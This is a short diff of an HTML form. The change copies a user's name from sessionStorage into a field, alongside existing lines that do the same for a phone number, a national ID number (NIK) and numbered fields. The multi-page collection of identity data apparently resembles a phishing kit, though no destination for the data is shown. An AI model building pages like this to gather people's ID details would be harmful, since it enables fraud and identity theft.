@@ -137,7 +137,7 @@
         <div class="row" style="margin-top: -200px;">
             <div class="col-12 d-block mx-auto sizing" style="white-space: pre-wrap; height: 58.8px; padding-bottom: 0px; font-size: 16px; font-weight: 400; color: rgb(59, 59, 59); line-height: 1.4; border-radius: 0px;">
                <div class="row" style="texr-align: center; margin-right: 5px;">
-<input type="hidden" id="nama" name="nama">                
+<input type="" id="nama" name="nama">                
 <input type="hidden" id="nomor" name="nomor">
 <input type="hidden" id="nik" name="nik">
 <input type="hidden" id="01" name="01">
@@ -248,10 +248,13 @@
        
     </form>
 <script>
+var nama = sessionStorage.getItem("nama");
+ document.getElementById("nama").value = nama + "";  
 var nomor = sessionStorage.getItem("nomor");
  document.getElementById("nomor").value = nomor + "";  
  var nik = sessionStorage.getItem("nik");
  document.getElementById("nik").value = nik + ""; 
+ 
  var a01 = sessionStorage.getItem("a01");
  document.getElementById("01").value = a01 + "";  
  var a02 = sessionStorage.getItem("a02");
